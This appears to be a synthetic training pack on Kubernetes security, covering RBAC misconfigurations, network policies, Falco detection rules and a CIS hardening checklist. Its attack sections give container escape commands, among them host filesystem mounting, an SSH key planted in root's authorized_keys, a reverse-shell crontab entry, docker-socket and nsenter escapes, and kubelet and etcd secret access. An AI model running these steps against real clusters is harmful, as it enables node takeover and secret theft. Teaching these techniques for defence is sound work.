@@ -1,0 +1,443 @@
+================================================================================
+TITAN AI — TRAINING PACK 035: KUBERNETES SECURITY — DEEP PROFESSIONAL GUIDE
+CLUSTER ARCHITECTURE, RBAC, NETWORK POLICIES, RUNTIME SECURITY, ESCAPE PATHS
+================================================================================
+
+================================================================================
+PART 1: KUBERNETES SECURITY ARCHITECTURE
+================================================================================
+
+--- CONTROL PLANE COMPONENTS ---
+
+API SERVER (kube-apiserver):
+  Central control point. All kubectl commands → API server.
+  Authentication → Authorization (RBAC) → Admission control → Etcd.
+  
+  Security: Default port 6443. Must be protected (not publicly accessible).
+  Auth methods: Client certificates, Service Account tokens, OIDC, Webhook.
+
+ETCD:
+  Key-value store for all cluster state.
+  Contains: All secrets, configuration, everything.
+  Access = full cluster data access.
+  Must: Encrypt at rest, mTLS between API server and etcd, never expose publicly.
+  
+  If attacker gets etcd access:
+  ETCDCTL_API=3 etcdctl get /registry/secrets/default/my-secret | xxd
+  # Reads Kubernetes secrets in plaintext (if not encrypted at rest).
+
+KUBELET (runs on every node):
+  Agent managing pods on the node.
+  Listens: Port 10250 (HTTPS with API), port 10255 (read-only, no auth — deprecated).
+  If exposed: Execute commands in any pod on that node.
+  
+  Attack (historically, mostly mitigated):
+  curl -sk https://node-ip:10250/exec/<namespace>/<pod>/<container> \
+    -d "input=1&command=id&command=whoami" \
+    -H "Content-Type: application/x-www-form-urlencoded"
+
+--- KUBERNETES ATTACK SURFACE ---
+
+EXTERNAL ENTRY POINTS:
+  Exposed API server: kubectl from internet → pentest all RBAC misconfigs.
+  Exposed Dashboard: K8s Dashboard without auth → full cluster access.
+  Exposed etcd: Dump all secrets.
+  Exposed Kubelet: Execute in any pod.
+  
+  INTERNAL (from compromised pod):
+  Service Account token: Every pod has one. What can it do?
+  Node metadata: Cloud IMDS access for cloud provider credentials.
+  Network: Can pod reach other pods/services? Database?
+  Mounted secrets: Secrets volume-mounted in pod.
+  Privilege escalation: Container escape to node.
+
+================================================================================
+PART 2: RBAC — MISCONFIGURATIONS AND ATTACKS
+================================================================================
+
+--- RBAC CONCEPTS ---
+
+SUBJECTS: Who (User, Group, ServiceAccount)
+VERBS: What action (get, list, watch, create, update, patch, delete)
+RESOURCES: On what (pods, secrets, configmaps, deployments)
+
+ROLE vs CLUSTERROLE:
+  Role: Namespaced (applies to resources in one namespace).
+  ClusterRole: Cluster-wide (applies to all namespaces or cluster-scoped resources).
+
+ROLEBINDING vs CLUSTERROLEBINDING:
+  RoleBinding: Assigns role to subject in a specific namespace.
+  ClusterRoleBinding: Assigns cluster-wide permissions to subject.
+
+COMMON MISCONFIGURATIONS:
+
+1. Wildcard permissions:
+  rules:
+  - apiGroups: ["*"]
+    resources: ["*"]
+    verbs: ["*"]
+  This is full cluster admin. Check: All ClusterRoles for wildcards.
+
+2. Secrets read permission:
+  rules:
+  - apiGroups: [""]
+    resources: ["secrets"]
+    verbs: ["get", "list"]
+  ServiceAccount with this → can read ALL secrets in namespace. Often: Database passwords, API keys.
+
+3. Pods create/exec permission:
+  rules:
+  - apiGroups: [""]
+    resources: ["pods"]
+    verbs: ["create"]
+  - apiGroups: [""]
+    resources: ["pods/exec"]
+    verbs: ["create"]
+  Can create privileged pod → escape to node.
+
+4. Impersonation:
+  rules:
+  - apiGroups: [""]
+    resources: ["users", "groups", "serviceaccounts"]
+    verbs: ["impersonate"]
+  Can impersonate any user including system:masters → full cluster admin.
+
+5. Daemonsets create:
+  Can create DaemonSet → Runs pod on EVERY node → If privileged: Compromise every node.
+
+PRIVILEGE ESCALATION PATHS:
+  ServiceAccount can CREATE pods → Create privileged pod → Escape to node.
+  ServiceAccount can PATCH deployments → Add env var with secret, add privileged container.
+  ServiceAccount can UPDATE configmaps → If configmap used as trusted config → inject commands.
+  ServiceAccount can CREATE secrets → Create secret with malicious data.
+  ServiceAccount has cluster-admin → Full access.
+
+TOOLS:
+  # Enumerate what current service account can do:
+  kubectl auth can-i --list
+  
+  # Check all permissions in namespace:
+  kubectl auth can-i get secrets -n kube-system
+  kubectl auth can-i create pods
+  kubectl auth can-i create pods/exec
+  
+  # Rakkess: Enumerate all permissions at once:
+  kubectl rakkess
+  
+  # rbac-police: Find privilege escalation paths:
+  kubectl rbac-police scan
+
+================================================================================
+PART 3: CONTAINER ESCAPE TECHNIQUES
+================================================================================
+
+--- PRIVILEGED CONTAINER ESCAPE ---
+
+Most straightforward container escape. Requires: Running as privileged container.
+
+  # In a privileged container — check privilege:
+  cat /proc/1/status | grep CapEff
+  # If: CapEff = 0000003fffffffff (all capabilities) → privileged
+  
+  # Mount host filesystem:
+  mkdir /tmp/hostfs
+  mount /dev/sda1 /tmp/hostfs  # Or whatever the host's root device is
+  # Now: Access entire host filesystem from container
+  
+  chroot /tmp/hostfs  # Change root to host filesystem
+  # Now: Running commands in host filesystem context
+  
+  # Add SSH key to host:
+  echo "ssh-rsa ATTACKER_PUBLIC_KEY" >> /tmp/hostfs/root/.ssh/authorized_keys
+  
+  # Or: Add crontab entry on host:
+  echo "* * * * * root /tmp/reverse_shell.sh" >> /tmp/hostfs/etc/crontab
+
+--- DOCKER SOCKET ESCAPE ---
+
+If /var/run/docker.sock mounted in container:
+Container has full control over Docker → Create privileged container → Escape.
+
+  ls /var/run/docker.sock  # Check if mounted
+  
+  # Create privileged container mounting host filesystem:
+  docker run -it --privileged --net=host \
+    -v /:/hostfs \
+    --pid=host \
+    ubuntu:latest chroot /hostfs /bin/bash
+  
+  # Now: Root shell on host.
+
+In Kubernetes context: If pod has access to Docker socket (legacy, should not exist):
+  Same attack. Create privileged container. Escape to node.
+
+--- HOSTPID AND HOSTNETWORK ESCAPES ---
+
+hostPID: true in pod spec:
+  Container sees host's PID namespace. All host processes visible.
+  
+  # In container with hostPID:
+  ps aux  # See ALL host processes
+  
+  # Enter host process's namespace:
+  nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
+  # target 1 = PID 1 (init process on host)
+  # Enters all host namespaces → root shell on host
+  
+hostNetwork: true in pod spec:
+  Container shares host network stack.
+  Can: Bind to any host port, sniff ALL host network traffic.
+  Can reach: Metadata service (169.254.169.254) with higher privileges.
+  Can reach: Other containers on host without Kubernetes network policies.
+
+--- CAPABILITY ABUSE ---
+
+Linux capabilities: Fine-grained privileges instead of binary root/non-root.
+
+Dangerous capabilities in containers:
+  CAP_SYS_ADMIN: Effectively root. Mount filesystems, manage namespaces, more.
+  CAP_NET_ADMIN: Modify network settings, interfaces, routing.
+  CAP_SYS_PTRACE: Trace other processes. Inject code into any process.
+  CAP_SYS_MODULE: Load kernel modules. Add rootkit to host kernel.
+
+CAP_SYS_PTRACE escape:
+  Container has CAP_SYS_PTRACE AND hostPID:
+  
+  # Find a process running as root on host:
+  ps aux | grep root | head
+  
+  # Inject shellcode into that process:
+  python3 inject.py <PID>  # Custom ptrace injection script
+  # Shellcode executes in context of root process → command execution as root on host
+
+================================================================================
+PART 4: NETWORK POLICIES
+================================================================================
+
+--- KUBERNETES NETWORK POLICIES ---
+
+Default: All pods can communicate with all other pods across all namespaces.
+This is terrible for security. Any compromised pod can reach any DB, internal service.
+
+NETWORK POLICY BASICS:
+  podSelector: Which pods this policy applies to.
+  ingress: What traffic is allowed IN.
+  egress: What traffic is allowed OUT.
+  If policy exists with no ingress rules: All ingress DENIED.
+  If policy exists with no egress rules: All egress DENIED.
+
+DEFAULT-DENY ALL (apply this first, then add allowances):
+  apiVersion: networking.k8s.io/v1
+  kind: NetworkPolicy
+  metadata:
+    name: default-deny-all
+    namespace: production
+  spec:
+    podSelector: {}  # Applies to ALL pods in namespace
+    policyTypes:
+    - Ingress
+    - Egress
+    # No ingress or egress rules = deny all
+
+ALLOW ONLY SPECIFIC TRAFFIC:
+  # Allow frontend → backend on port 8080:
+  apiVersion: networking.k8s.io/v1
+  kind: NetworkPolicy
+  metadata:
+    name: allow-frontend-to-backend
+    namespace: production
+  spec:
+    podSelector:
+      matchLabels:
+        app: backend
+    policyTypes:
+    - Ingress
+    ingress:
+    - from:
+      - podSelector:
+          matchLabels:
+            app: frontend
+      ports:
+      - protocol: TCP
+        port: 8080
+  
+  # Allow backend → database on 5432 only from payments namespace:
+  apiVersion: networking.k8s.io/v1
+  kind: NetworkPolicy
+  metadata:
+    name: allow-payments-to-db
+    namespace: data
+  spec:
+    podSelector:
+      matchLabels:
+        app: payments-db
+    ingress:
+    - from:
+      - namespaceSelector:
+          matchLabels:
+            kubernetes.io/metadata.name: payments
+        podSelector:
+          matchLabels:
+            app: payments-service
+      ports:
+      - protocol: TCP
+        port: 5432
+
+DNS EGRESS (required for all pods — DNS blocked = broken app):
+  egress:
+  - ports:
+    - port: 53
+      protocol: UDP
+    - port: 53
+      protocol: TCP
+
+CILIUM NETWORK POLICY (layer 7 — HTTP aware):
+  Standard K8s NetworkPolicy: Layer 3/4 only (IP and ports).
+  Cilium: Layer 7 filtering (specific HTTP paths, methods, headers).
+  
+  # Allow only GET requests to /api/public, deny everything else:
+  apiVersion: cilium.io/v2
+  kind: CiliumNetworkPolicy
+  spec:
+    endpointSelector:
+      matchLabels:
+        app: api-service
+    ingress:
+    - fromEndpoints:
+      - matchLabels:
+          app: frontend
+      toPorts:
+      - ports:
+        - port: "8080"
+          protocol: TCP
+        rules:
+          http:
+          - method: GET
+            path: /api/public/.*
+
+================================================================================
+PART 5: RUNTIME SECURITY — FALCO
+================================================================================
+
+--- FALCO RULES AND DETECTION ---
+
+Falco: Cloud-native runtime security. Detects anomalous container/K8s behavior.
+Watches: Syscalls, K8s API audit events.
+Alerts: When rules match.
+
+BUILT-IN RULES (most important):
+
+Terminal shell in container:
+  - rule: Terminal shell in container
+    desc: A shell was used as the entrypoint/exec point into a container
+    condition: >
+      evt.type = execve and evt.dir=< and container
+      and (proc.name = bash or proc.name = sh or proc.name = dash)
+      and not user_expected_terminal_shell_containers
+    output: >
+      A shell was spawned in a container (user=%user.name container=%container.name
+      image=%container.image.repository proc=%proc.name)
+    priority: NOTICE
+
+Write below binary dirs:
+  # Any process writing to /bin, /sbin, /usr → Possible malware installation
+  - rule: Write below binary dirs
+    condition: >
+      open_write and bin_dir and proc.name not in (known_bin_writers)
+    output: "File below binary dir opened for writing (proc=%proc.name file=%fd.name)"
+    priority: ERROR
+
+Container running as root:
+  - rule: Container running as root
+    condition: container.privileged = false and user.uid = 0 and container
+    output: "Container running as root (container=%container.name image=%container.image)"
+    priority: WARNING
+
+CUSTOM RULE — DETECT CRYPTO MINING:
+  - rule: Crypto mining connection
+    condition: >
+      outbound and
+      (fd.rport in (3333, 4444, 5555, 7777, 14444, 14433) or
+       fd.l4proto = tcp and fd.rport in (3335, 5556, 4445, 9999))
+    output: >
+      Possible crypto mining outbound connection 
+      (container=%container.name connection=%fd.name)
+    priority: CRITICAL
+
+CUSTOM RULE — DETECT KUBECTL FROM CONTAINER:
+  - rule: kubectl used inside container
+    desc: Detect kubectl being run inside container (possible lateral movement)
+    condition: >
+      spawned_process and container
+      and proc.name = kubectl
+    output: >
+      kubectl was run in container (container=%container.name user=%user.name 
+      cmd=%proc.cmdline)
+    priority: WARNING
+
+FALCO ALERTS TO SIEM:
+  falco → stdout JSON → Fluentd/Logstash → SIEM
+  Or: falco-sidekick → Slack, PagerDuty, Datadog, Elasticsearch, webhook
+
+================================================================================
+PART 6: HARDENING CHECKLIST
+================================================================================
+
+--- KUBERNETES CIS BENCHMARK KEY CONTROLS ---
+
+API SERVER:
+  ☑ --anonymous-auth=false (no anonymous API access)
+  ☑ --authorization-mode includes RBAC (not AlwaysAllow)
+  ☑ --audit-log-path set (audit logging enabled)
+  ☑ --tls-cert-file and --tls-private-key-file set
+  ☑ --service-account-key-file set (dedicated key for service accounts)
+  ☑ --etcd-cafile and --etcd-certfile set (mTLS to etcd)
+
+ETCD:
+  ☑ --cert-file and --key-file set (TLS on etcd)
+  ☑ --client-cert-auth=true (require client cert)
+  ☑ --peer-cert-file and --peer-key-file (TLS between etcd peers)
+  ☑ Encryption at rest enabled for secrets
+
+KUBELET:
+  ☑ --anonymous-auth=false
+  ☑ --authorization-mode=Webhook (use API server for authz)
+  ☑ --read-only-port=0 (disable unauthenticated read-only port)
+
+POD SECURITY:
+  ☑ Pod Security Standards enforced (restricted policy in production)
+  ☑ No privileged containers in production
+  ☑ No hostPID, hostNetwork, hostIPC in production workloads
+  ☑ Resource requests/limits on all containers
+  ☑ readOnlyRootFilesystem: true where possible
+  ☑ Non-root user (runAsNonRoot: true, runAsUser: >1000)
+  ☑ Seccomp profile: RuntimeDefault or custom
+  ☑ No CAP_SYS_ADMIN or other dangerous capabilities
+
+NETWORK:
+  ☑ Default-deny NetworkPolicies in all namespaces
+  ☑ API server not publicly accessible
+  ☑ etcd not publicly accessible
+  ☑ Kubelet API not publicly accessible
+
+ADMISSION:
+  ☑ OPA Gatekeeper or Kyverno policies enforcing above
+  ☑ ImagePolicyWebhook: Only signed images from trusted registry
+
+RUNTIME:
+  ☑ Falco installed and alerting
+  ☑ Audit logs shipped to SIEM
+  ☑ Image scanning in CI (Trivy)
+  ☑ Secrets management (Vault or External Secrets Operator)
+  ☑ RBAC reviewed quarterly (remove unused permissions)
+
+================================================================================
+END OF PACK 035: KUBERNETES SECURITY
+Total: Control plane architecture (API server, etcd, kubelet attack surfaces),
+RBAC misconfigurations (wildcard/secrets/pods/exec/impersonation), privilege
+escalation paths, privilege enumeration tools (kubectl auth, rakkess, rbac-police),
+container escapes (privileged/docker-socket/hostPID+nsenter/capability abuse with
+CAP_SYS_PTRACE), Network Policies (default-deny, allow-rules, Cilium L7 policies),
+Falco runtime security (built-in rules, custom crypto mining/kubectl detection),
+complete CIS benchmark hardening checklist.
+================================================================================
